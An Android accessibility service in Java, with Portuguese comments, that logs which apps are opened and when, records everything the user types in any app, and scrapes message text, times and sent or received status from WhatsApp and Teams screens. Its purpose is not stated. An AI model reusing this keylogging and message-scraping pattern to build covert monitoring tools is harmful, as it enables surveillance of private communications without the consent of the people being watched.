package vox.com.br.services;

import static androidx.constraintlayout.helper.widget.MotionEffect.TAG;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.List;
import java.util.Objects;

import vox.com.br.dao.AppAbertoDao;
import vox.com.br.dao.MessageDao;
import vox.com.br.model.AppAberto;
import vox.com.br.model.Message;

public class MyAccessibilityService extends AccessibilityService {

    // Foi mal pelo código ruim, com tempo pode ter certeza que vou melhorar (pelo menos está funcionando)
    // Quando acontecer um Evento de acessibilidade, esse código é executado
    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

        Log.e(TAG, "onAccessibilityEvent: " + accessibilityEvent.getEventType());

        // Pegando uma Instância do AppAbertoDao para receber e popular os dados
        AppAbertoDao appAbertoDao = new AppAbertoDao();

        // Aqui pegamos o nome do pacote do evento estamos usando: (TYPE_WINDOW_STATE_CHANGED)
        String nomeDoApp = accessibilityEvent.getPackageName().toString();

        // Resgatando o Horário com Calendar
        Calendar now = Calendar.getInstance();
        String horarioDoOcorrido = now.get(Calendar.HOUR_OF_DAY) + ":" + now.get(Calendar.MINUTE) + ":" + now.get(Calendar.SECOND);

        PackageManager packageManager = this.getPackageManager();
        Intent intent = new Intent("android.intent.action.MAIN");
        intent.addCategory("android.intent.category.HOME");


        // Se o evento for do tipo TYPE_VIEW_CLICKED
        if (AccessibilityEvent.TYPE_VIEW_CLICKED == accessibilityEvent.getEventType()) {
        Log.e(TAG, "OnType_View_Clicked: " + accessibilityEvent.getSource() );
        }

        // Se o evento for do tipo TYPE_WINDOW_CONTENT_CHANGED -------------------------------------
        if (AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED == accessibilityEvent.getEventType()) {
            try {
                ApplicationInfo applicationInfo = packageManager.getApplicationInfo(nomeDoApp, 0);
                CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);

                if (applicationLabel.toString().equals("WhatsApp") || applicationLabel.toString().equals("Teams")) {
                    Log.e(TAG, "OnTYPE_WINDOW_CONTENT_CHANGED: " );

                    logViewGroup(getRootInActiveWindow(), 0);

                }

            } catch (PackageManager.NameNotFoundException e) {
                throw new RuntimeException(e);
            }
        }

        // se o evento for do tipo TYPE_VIEW_TEXT_CHANGED ------------------------------------------
        if (AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED == accessibilityEvent.getEventType()) {
            // Resgatando o nome do App
            ApplicationInfo applicationInfo;
            try {
                applicationInfo = packageManager.getApplicationInfo(nomeDoApp, 0);
            } catch (PackageManager.NameNotFoundException e) {
                throw new RuntimeException(e);
            }
            CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);

            // Resgando oq está sendo digitado pelo usuário em um TextEdit
            List<String> textoDigitado = new ArrayList<>();
            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                Log.e(TAG, "onAccessibilityEvent: " + accessibilityEvent.getText().get(0).toString());
                textoDigitado.add(accessibilityEvent.getText().get(0).toString());

                Log.e(TAG, "onAccessibilityEvent: " + textoDigitado);
                AppAberto appAbertoAtual = new AppAberto(applicationLabel.toString(), horarioDoOcorrido, now, textoDigitado);
                appAbertoDao.atualizarDigitados(appAbertoAtual);
            }
        }

        // Se o evento for do tipo TYPE_WINDOW_STATE_CHANGED ---------------------------------------
        if (AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED == accessibilityEvent.getEventType()) {
            try {
                // Resgatando o nome do App
                ApplicationInfo applicationInfo = packageManager.getApplicationInfo(nomeDoApp, 0);
                CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);

                // Criando uma intância do AppAberto
                List<String> textoDigitado = new ArrayList<>();
                AppAberto appAbertoAtual = new AppAberto(applicationLabel.toString(), horarioDoOcorrido, now, textoDigitado);

                // Verificando se existe algo no historico (se não existe quer dizer que o app está iniciando agora)
                if (appAbertoDao.getTodosHistorico().isEmpty()) {
                    appAbertoDao.salvarNoHistorico(appAbertoAtual);
                    appAbertoDao.salvar(appAbertoAtual);
                } else if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                    // nada pode acontecer pois o evento é para atualizar o que foi digitado
                } else { // Executado quando for e evento mudança no estado da tela, e não for a primeira vez iniciando

                    // Verificando se mudou o App, Aqui pego o último item no Historico e comparo o app atual.
                    // Se eles forem iguais quer dizer que houve uma mudança no estado da tela do mesmo app, e não precisamos fazer nada sobre pois estamos no msm app.
                    if (!Objects.equals(appAbertoDao.getTodosHistorico().get(appAbertoDao.getTodosHistorico().size() - 1).getNome(), appAbertoAtual.getNome())) {

                        appAbertoDao.salvarNoHistorico(appAbertoAtual);
                        appAbertoDao.salvar(appAbertoAtual);

                        // Resgando o último app aberto registrado para comparar depois
                        AppAberto ultimoAppAberto = appAbertoDao.getTodos().get(appAbertoDao.getTodos().size() - 1); // pegando o último item da lista getTodos()

                        // último item do historico deve ser diferente do ultimo app aberto (precisamos disso?)
                        if (!Objects.equals(appAbertoDao.getTodosHistorico().get(appAbertoDao.getTodosHistorico().size() - 1).getNome(), ultimoAppAberto.getNome())) {

                            // penultimo item do historico deve ser igual o ultimo app registrado
                            if (Objects.equals(appAbertoDao.getTodosHistorico().get(appAbertoDao.getTodosHistorico().size() - 2).getNome(), ultimoAppAberto.getNome())) {
                                appAbertoDao.atualizarHorario(ultimoAppAberto, appAbertoAtual);
                            }
                        }
                    }
                }
            } catch (
                    PackageManager.NameNotFoundException e) {
                throw new RuntimeException(e);
            }
        }

    }

    @Override
    public void onInterrupt() {
        Log.e(TAG, "onInterrupt: Algo deu errado");
    }

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();

        AccessibilityServiceInfo info = getServiceInfo();

        info.flags |= AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        setServiceInfo(info);

        info.eventTypes |=
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                        AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                        AccessibilityEvent.TYPE_VIEW_CLICKED
        ;

        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;

        info.notificationTimeout = 100;

        this.setServiceInfo(info);

        // Quando uma conexão com o serviço foi estabelecida (variável para manipular isso?)
        Log.e(TAG, "onServiceConnected: ");
    }

    // Lista de mensagens
    public static void logViewGroup(AccessibilityNodeInfo nodeInfo, int depth) {

        if (nodeInfo == null) return;

//        MessageDao messageDao = new MessageDao();

        String logString = "";

        for (int i = 0; i < depth; ++i) {
            logString += " ";
        }



        CharSequence texto = nodeInfo.getText();
        CharSequence descricao = nodeInfo.getContentDescription();
        String className = nodeInfo.getClassName().toString();


        logString += "Text: " + texto + " " +
                " Content-Description: " + descricao + " " +
                "Tipo View: " + nodeInfo.getClassName().toString() + " "
        ;

        // Antes de chegar aqui, no loop for foi enviado o irmão dele, existem 2 layout no depth 14, que são o texto e horario com estado ou sem.
        //  depth = 14, className = android.widget.TextView
        if (depth == 14) {
            Message msg = new Message();

            // depth = 13, className = android.widget.FrameLayout
            AccessibilityNodeInfo fatherOfNodeInfo = nodeInfo.getParent();
            // depth = 14, className = android.widget.LinearLayout
            AccessibilityNodeInfo brotherOfNodeInfo = fatherOfNodeInfo.getChild(1);
            int qtdDeChild = brotherOfNodeInfo.getChildCount();


            // Essa Depth e classname carrega o horario enviado ou recebido
            // depth = 15, className = android.widget.TextView
            AccessibilityNodeInfo childDepth15 = brotherOfNodeInfo.getChild(0);
            CharSequence horario = childDepth15.getText(); // Horario
            msg.setHorario(horario.toString());

            if (qtdDeChild == 1) {
                msg.setEstado(Message.Estado.RECEBIDO);
            } else {
                // Essa Depth e classname carrega o estado enviado ou recebido
                // depth = 15, className = android.widget.ImageView
                AccessibilityNodeInfo secondChildDepth15 = brotherOfNodeInfo.getChild(1);
                CharSequence estado = secondChildDepth15.getContentDescription();
                msg.setEstado(Message.Estado.ENVIADO);
            }

            // Pegar mensagem do texto
            if (texto != null && className.equals("android.widget.TextView")) {
                msg.setTexto(texto.toString());
            }

            Log.e(TAG, "logNodeHeirarchy: " + logString );
            Log.e(TAG, "logNodeHeirarchy: " + msg );

        } if (depth == 12) {
            Log.e(TAG, "Dia mandado: " + logString );
        }


        // Aqui precisamos achar o TextView na posição 14, e pegar junto com ele a próxima Child da mesma posição
        // Essa proxima Child carrega o horário e seu estado (recebido ou enviado)
        for (int i = 0; i < nodeInfo.getChildCount(); ++i) {
            logViewGroup(nodeInfo.getChild(i), depth + 1);
        }
    }


}
